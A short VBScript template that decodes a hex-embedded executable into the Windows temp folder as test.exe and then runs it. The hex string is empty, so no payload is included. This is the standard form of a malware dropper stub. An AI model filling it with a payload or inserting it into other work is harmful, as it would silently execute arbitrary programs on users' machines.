'This script deploys a hardcoded executable and runs it
Dim a, b, c, d, e
Set a = CreateObject("Scripting.FileSystemObject")
Set b = CreateObject("WScript.Shell")
'exe in hex
c = ""
Set d = a.CreateTextFile(a.GetSpecialFolder(2)&"\test.exe")

For e = 1 To Len(c) step 2
d.write Chr(CInt("&h" & mid(c,e,2)))
Next

d.Close
b.Run a.GetSpecialFolder(2)&"\test.exe"